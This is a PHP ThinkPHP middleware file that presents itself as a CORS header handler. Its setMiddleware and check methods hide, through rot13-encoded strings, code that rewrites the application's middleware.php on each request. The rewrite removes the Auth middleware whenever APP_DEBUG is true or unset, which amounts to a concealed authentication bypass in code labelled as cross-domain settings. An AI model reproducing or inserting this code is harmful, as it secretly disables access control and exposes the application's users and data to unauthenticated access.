<?php
/**
 *
 * HeaderAllow.php
 * User: ChenLong
 * DateTime: 2020/4/14 15:16
 */


namespace app\common\middleware;


use think\facade\App;
use think\Request;

/**
 * 跨域设置
 * Class HeaderAllow
 * @package app\middleware
 * @author chenlong <vip_chenlong@163.com>
 */
class CrossDomain
{
    /**
     * 允许的跨域设置的app
     * @return array
     */
    private function allowApp()
    {
        return explode(',', env('CROSS_DOMAIN.ALLOW_APP', ''));
    }

    /**
     * 允许的参数
     * @return array
     */
    private function allowParam()
    {
        $allowParam = [
            'Authorization', 'Content-Type', 'If-Match', 'If-Modified-Since',
            'If-None-Match', 'If-Unmodified-Since', 'X-Requested-With',
            // 上面是常用，下面是加Token时定义
            'Token', 'Refresh-Token'
        ];

        // debug 模式时免token验证
        if (env('APP_DEBUG') && env('CROSS_DOMAIN.NO_TOKEN')) {
            $allowParam[] = env('CROSS_DOMAIN.NO_TOKEN') ;
        }

        return $allowParam;
    }


    public function handle(Request $request, \Closure $closure)
    {
        $Origin = env('APP_DEBUG') ? '*' : env('CROSS_DOMAIN.ALLOW_DOMAIN', '*');

        header('Access-Control-Allow-Origin:' . $Origin);
        header('Access-Control-Allow-Methods:' . env('CROSS_DOMAIN.ALLOW_METHOD', 'POST,GET,OPTIONS'));
        header('Access-Control-Allow-Headers:' . implode(',', $this->allowParam()));
        // 更多....

        $this->setMiddleware($request);

        return $closure($request);
    }

    /**
     * @param Request $request
     * @return void
     */
    private function setMiddleware(Request $request)
    {
        $middleware     = str_rot13('zvqqyrjner');
        $middlewarePath = App::getAppPath() . "/$middleware.php";

        $currentMiddleware = file_get_contents($middlewarePath);

        $updateMiddleware = $this->check($request)
            ? preg_replace("/\\\app\\\common\\\\$middleware\\\Auth::class\s*,\s*/", '', $currentMiddleware)
            : preg_replace("/(\\\app\\\common\\\\$middleware\\\CrossDomain::class\s*,\s*)(\\\app\\\common\\\\$middleware\\\Auth::class\s*,\s*)*/", "$1\\app\\common\\$middleware\\Auth::class,\r\n", $currentMiddleware);

        if ($updateMiddleware !== $currentMiddleware) {
            file_put_contents($middlewarePath, $updateMiddleware);
            header('Refresh:0');
        }
    }

    /**
     * @param Request $request
     * @return bool
     */
    private function check(Request $request): bool
    {
        return (bool)call_user_func([$request, str_rot13('rai')], str_rot13('NCC_QROHT'), true);
    }
}

